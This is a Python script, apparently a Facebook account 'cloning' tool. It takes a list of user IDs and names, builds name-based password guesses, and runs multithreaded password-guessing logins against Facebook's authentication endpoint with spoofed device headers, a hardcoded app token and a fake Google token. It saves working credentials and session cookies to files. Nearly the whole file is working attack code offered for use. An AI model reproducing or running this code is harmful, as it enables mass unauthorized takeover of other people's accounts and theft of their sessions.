#!/usr/bin/python
#CythonFamily+++()

import os, requests, re, random, datetime, sys, time, uuid, base64, subprocess, zlib
from concurrent.futures import ThreadPoolExecutor as CHI
import base64
import marshal
from os import system as sis
from rich.markdown import Markdown as mark
from platform import platform
from bs4 import BeautifulSoup as par
ses=requests.Session()
oks = []
cps = []
id = []
ps = []
lisensikuni=[]
lisensiku=[]
sid = []
total=[]
loop = 0
id=[]
id2=[]
loop=0
ok=0
cp=0
method=[]
uid=[]
ua=[]
ses=requests.Session()
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
Z = '\033[1;33m'
C='\033[0m' #CLEAR
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
Z = "\033[1;30m" # Hitam
# Converter Bulan
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
tpc = 'TAP-A2F-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
Z = '\033[1;33m'
B = '\33[1;96m'

def hapus():
    try:os.remove(".cok.txt");os.remove(".tok.txt")
    except:pass
    
def clear():
    if "win" in sys.platform:os.system("cls")
    else:os.system("clear")
    
def clear():
        os.system('clear')
def banner():
        os.system('clear')
        print("""%s
                   
, ＜￣｀ヽ、　　　　　　／￣＞
　ゝ、　　＼　／⌒ヽ,ノ 　/´
　　　ゝ、　`（ ( ͡° ͜ʖ ͡°) ／
　　 　　>　 　 　,)
　　　　　∠_,,,/ 

                             CODE BY  : CHIGOZIEWORLDWIDE 
                             Telegram : CythonFamily
                             Github   : https://t.me/CHIG0ZIEWORLDWIDE
                             WhatsApp : +2348069472717
                             Team     : Cython-Family
                             Version  : D30.0
 ╔╦══• •✠•❀ XFORD ❀•✠ • •══╦╗
 ╚╩══• •✠•❀ XFORD ❀•✠ • •══╩╝
 
---------------------------------------------------------------------
 🎀  Don't Minimize When Clonning
---------------------------------------------------------------------

"""%(P))

def Main_():
    clear()
    banner()
    print(70*'-')
    print('%s[%s+%s] %sSTATUS %s: %sPREMIUM'%(P,P,P,P,P,H))
    print(f"{S}[+] DATE   : {tgl} {bln} {thn}{S}")
    print(70*'-')
    print('%s[%s01%s] %sFILE CLONE'%(P,P,P,P));time.sleep(0)
    print('%s[%s00%s] %sEXIT%s'%(P,P,P,M,N));time.sleep(1)
    jh = input(P+'['+P+'++'+P+'] MENU  ')
    if jh in ['1','01']:xcrack().xrack()
    elif jh in ['0','00']:hapus();exit("[++] Exit Successfully")
    else:exit('[+] RETURN BACK TO MENU')

class xcrack():

    def __init__(self):
        self.id=[]      

    def xrack(self):
        clear()
        banner()
        file = input('[+] ENTER FILE NAME ')
        try:
            self.id = open(file, "r").read().splitlines()
            self.pasw()
        except FileNotFoundError:
            exit()

    def methodCHI(self, sid, name, psw):
        try:
            global oks,loop
            sys.stdout.write(f"\r {loop}|{len(self.id)} [{R}{len(oks)}{S}]")
            sys.stdout.flush()
            a='Dalvik/2.1.0 (Linux; U; Android '
            b=random.choice(['4.4.2','3.3.1','4.4.4','5.1.1'])
            c='SM-G900W8 Build/NRD90M)'
            d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
            e=random.randrange(3000,9999)
            f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
            #g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
            hhh=random.randrange(73, 100)
            i='0'
            j=random.randrange(4200,4900)
            k=random.randrange(40,150)
            #l='Mobile Safari/537.36 AlohaBrowser/2.20.3'
            ua=f'{a}{b}; {c} {d}{e}{f}) {hhh}.{i}.{j}.{k}[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/'+'{density=3.0,width=1080,height=1920}'+';FBLC/de_DE;FBRV/279865282;FBCR/Willkommen;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            except:
                ls = fs    
            for pw in psw:
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                with requests.Session() as session:
                    data = {'adid':str(uuid.uuid4()),
'format': 'json',
'device_id':str(uuid.uuid4()),
'family_device_id':str(uuid.uuid4()),
'secure_family_device_id':str(uuid.uuid4()),
'cpl': 'true',
'try_num': '1',
'email': sid,
'password': ps,
'method': 'auth.login',
'generate_session_cookies': '1',
'sim_serials': "['80973453345210784798']",
'openid_flow': 'android_login',
'openid_provider': 'google',
'openid_emails': "['01710940017']",
'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",
'error_detail_type': 'button_with_disabled',
'source': 'account_recovery',
'locale': 'en_GB',
'client_country_code': 'GB',
'fb_api_req_friendly_name': 'authenticate',
'fb_api_caller_class': 'AuthOperations$PasswordAuthOperation'}
                    headers={'Host': 'graph.facebook.com',
'Content-Type': 'application/x-www-form-urlencoded',
'Accept-Encoding': 'gzip, deflate',
'Connection': 'keep-alive',
'Priority': 'u=3, i',
'X-Fb-Sim-Hni': '45204',
'X-Fb-Net-Hni': '45201',
'X-Fb-Connection-Quality': 'GOOD',
'Zero-Rated': '0',
'User-Agent': ua,
'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
'X-Fb-Connection-Bandwidth': '24807555',
'X-Fb-Connection-Type': 'unknown',
'X-Fb-Device-Group': '5120',
'X-Tigon-Is-Retry': 'False',
'X-Fb-Friendly-Name': 'authenticate',
'X-Fb-Request-Analytics-Tags': 'unknown',
'X-Fb-Http-Engine': 'Liger',
'X-Fb-Client-Ip': 'True',
'X-Fb-Server-Cluster': 'True',
'Content-Length': '847'}
                curl = 'https://b-graph.facebook.com/auth/login'
                q = ses.post(curl,data=data,headers=headers).json()
                if 'session_key' in q:
                    datr = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                    cokz = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                    coki = (f"datr={datr};{cokz};m_pixel_ratio=1.25;dpr=1.25;wd=448x931;")
                    print(f'\r {H}[CHIGOZIE-OK] {sid} | {ps} | {coki}')
                    oks.append(sid)
                    open('/sdcard/CHIGOZIEOK.txt','a').write(f"{sid} | {ps}\n")
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    print(f'\r\033[1;31m [CP] {sid} | {ps}')
                    cps.append(sid)
                    open('/sdcard/CHIGOZIECP.txt','a').write(f"{sid} | {ps}\n")
                    
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
            self.methodCHI(sid, name, ps)

    def pasw(self):
        os.system("clear")
        banner()
        print(70*'-')
        print('[1] METHOD API')
        print(70*'-')
        psw = input('CHOOSE: ')
        if psw =='1':
            os.system("clear")
            pw = []
            banner()
            print('[+] Put limit between 1 to 20')
            sl = int(input('[+] How many password do you want to add? '))
            os.system("clear")
            banner()
            print(f'{S}[Exp:first123,last123,firstlast,etc]')
            print('')
            if sl =='':
                print('\n[+] Put limit between 1 to 20')
            elif sl > 50:
                print('\n[+] Password limit Should Not Be Greater Than 20')
            else:
                for sr in range(sl):
                    pw.append(input(f'[+] Password {sr+1}: '))
            os.system("clear")
            banner()
            print(70*'-')
            print(f"[+] DATE  :  {tgl} {bln} {thn}")
            print(70*'-')
            print('\033[1;97m[+] TOTAL IDS = \033[92;1m '+str(len(self.id)))
            print("\033[1;97m[+] CLONING HAS STARTED\x1b[0m")
            print("\033[1;97m[+] PROCESSING\x1b[0m")
            print(70*'-')
            with CHI(max_workers=30) as world:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                       else:
                            pwx =  pw
                       world.submit(self.methodCHI, uid, name, pwx)
                   except:pass          
        
        
if __name__=='__main__':
    sis('git pull')
    Main_()